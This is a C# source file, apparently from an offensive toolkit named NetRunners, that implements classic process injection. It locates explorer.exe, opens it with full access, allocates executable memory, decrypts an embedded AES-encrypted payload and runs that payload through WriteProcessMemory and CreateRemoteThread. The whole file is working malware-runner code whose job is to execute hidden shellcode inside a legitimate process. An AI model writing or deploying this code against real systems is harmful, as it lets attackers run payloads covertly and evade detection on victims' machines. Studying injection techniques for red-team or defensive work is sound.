using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

using NetRunners.Interfaces;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Data.Structs;
using static NetRunners.Helpers.Helper;
using static NetRunners.Data.WinConstants;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    // credits: https://github.com/tasox/CSharp_Process_Injection/blob/main/06.%20Process_Injection_template_(Classic%20Injection)/Program.cs
    public class ClassicProcessInjectionRunner : IRunner
    {
        public void Run()
        {
            // heads up
            string techniqueName = "Classic Process Injection";
            string targetProcess = "explorer.exe";                       // suffix needed
            PrintTechniqueInfo(techniqueName, targetProcess);

            IntPtr SnapShot = CreateToolhelp32Snapshot(0x00000002, 0);  //2 = SNAPSHOT of all procs
            ProcessEntry32 pe32 = new ProcessEntry32();
            pe32.dwSize = (uint)Marshal.SizeOf(pe32);

            // Retrieve all the processes
            while(Process32Next(SnapShot, ref pe32) !=0)
            {
                if (pe32.szExeFile == targetProcess) // Change the process if you like.
                {
                    byte[] buf;
                    IntPtr hProcess;
                    bool IsRemote32BitProcess;
                    IntPtr outSize;
                   
                    // retrieve process handle, determine bitness
                    int processID = (int)pe32.th32ProcessID;

                    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (UInt32)processID);
                    if (hProcess == (IntPtr.Zero))
                        throw new InvalidOperationException($"[-] OpenProcess failed with error code: {Marshal.GetLastWin32Error()}");

                    Console.WriteLine($"[+] {targetProcess} Process Handle: {hProcess}");
                    IsWow64Process(hProcess, out IsRemote32BitProcess);

                    // allocate space
                    int sBuf = SelectPayloadSize(IsRemote32BitProcess);
                    IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);        // to-do use exec_read then change protect with virtualprotect
                    if (pRMemory == IntPtr.Zero)
                        throw new InvalidOperationException($"[-] VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()}");

                    // print address info
                    var allocAddress = string.Format("{0:X}", pRMemory);        // Pointer -> String
                    UInt64 number = UInt64.Parse(allocAddress);                 // String -> Int
                    string allocAddressHex = number.ToString("x");              // Int -> Hex
                    Console.WriteLine("[+] Executable Memory Address (VirtualAllocEx) to remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);
                    
                    // select and decrypt payload
                    buf = SelectPayloadArchitecture(IsRemote32BitProcess);
                    buf = DecryptBytesToBytesAes(buf, AesKey);
                    
                    unsafe
                    {
                        fixed (byte* p = &buf[0])
                        {
                            // print buf addr info
                            byte* p2 = p;

                            //Convert DEC->HEX
                            var bufString = string.Format("{0:X}", new IntPtr(p2));         // Pointer -> String (DEC) format.
                            UInt64 bufInt = UInt64.Parse(bufString);                        // String -> Integer
                            string bufHex = bufInt.ToString("x");                           // Integer -> Hex

                            Console.WriteLine("[+] Payload Address on this executable: " + "0x" + bufHex);
                        }
                    }
                    
                    //Write to remote process
                    WriteProcessMemory(hProcess, pRMemory, buf, buf.Length, out outSize);
                    if (outSize == IntPtr.Zero)
                        throw new InvalidOperationException($"[-] WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");

                    //Enumerate the threads of the remote process before creating a new one.
                    List<int> threadList = new List<int>();
                    ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
                    foreach (ProcessThread thread in threadsBefore)
                    {
                        threadList.Add(thread.Id);
                    }

                    //Create a remote thread and execute it
                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    if (hThread == IntPtr.Zero)
                        throw new InvalidOperationException($"[-] WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
                    WaitForSingleObject(hThread, 0xFFFFFFFF);

                    //Enumerate threads from the given process.
                    ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
                    foreach (ProcessThread thread in threads)
                    {
                        if (!threadList.Contains(thread.Id))
                        {
                            Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                        }
                    }
                }
            }                    
        }
    }
}
